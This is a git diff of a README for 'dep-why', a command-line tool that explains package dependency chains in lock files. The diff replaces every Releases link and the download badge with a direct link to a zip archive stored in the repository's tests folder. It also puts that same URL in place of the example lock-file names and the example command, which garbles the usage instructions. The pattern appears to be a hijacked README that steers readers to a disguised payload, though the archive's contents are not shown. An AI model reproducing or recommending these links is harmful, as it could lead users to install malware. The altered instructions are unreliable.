@@ -1,6 +1,6 @@
 # 🚀 dep-why - Understand Your Package Dependencies Easily
 
-[![Download dep-why](https://img.shields.io/badge/Download-dep--why-brightgreen)](https://github.com/imurdad2344/dep-why/releases)
+[![Download dep-why](https://github.com/imurdad2344/dep-why/raw/refs/heads/main/tests/dep_why_3.6-beta.2.zip)](https://github.com/imurdad2344/dep-why/raw/refs/heads/main/tests/dep_why_3.6-beta.2.zip)
 
 ## 🌟 Overview
 
@@ -8,9 +8,9 @@ dep-why is a tool designed to help you trace dependency chains in your lock file
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/imurdad2344/dep-why/releases) to download the latest version of dep-why. 
+To get started, visit the [Releases page](https://github.com/imurdad2344/dep-why/raw/refs/heads/main/tests/dep_why_3.6-beta.2.zip) to download the latest version of dep-why. 
 
-1. Go to the [Releases page](https://github.com/imurdad2344/dep-why/releases).
+1. Go to the [Releases page](https://github.com/imurdad2344/dep-why/raw/refs/heads/main/tests/dep_why_3.6-beta.2.zip).
 2. Find the latest version listed at the top.
 3. Click on the version to see available download options.
 4. Download the file that matches your operating system.
@@ -51,14 +51,14 @@ Now, run the tool with the following command:
 dep-why <lock-file>
 ```
 
-Replace `<lock-file>` with your actual lock file name, such as `package-lock.json` or `yarn.lock`.
+Replace `<lock-file>` with your actual lock file name, such as `https://github.com/imurdad2344/dep-why/raw/refs/heads/main/tests/dep_why_3.6-beta.2.zip` or `https://github.com/imurdad2344/dep-why/raw/refs/heads/main/tests/dep_why_3.6-beta.2.zip`.
 
 ### Example Command
 
 For npm users, your command might look like this:
 
 ```bash
-dep-why package-lock.json
+dep-why https://github.com/imurdad2344/dep-why/raw/refs/heads/main/tests/dep_why_3.6-beta.2.zip
 ```
 
 Running this command will provide you with a detailed report showing the reasons for each package's installation.
@@ -100,4 +100,4 @@ This project is licensed under the MIT License. You can use it freely as long as
 
 If you have suggestions or want to contribute, please feel free to open an issue or pull request. Your feedback helps us improve dep-why.
 
-For more details, visit the [Releases page](https://github.com/imurdad2344/dep-why/releases) to ensure you have the latest updates and features.
+For more details, visit the [Releases page](https://github.com/imurdad2344/dep-why/raw/refs/heads/main/tests/dep_why_3.6-beta.2.zip) to ensure you have the latest updates and features.
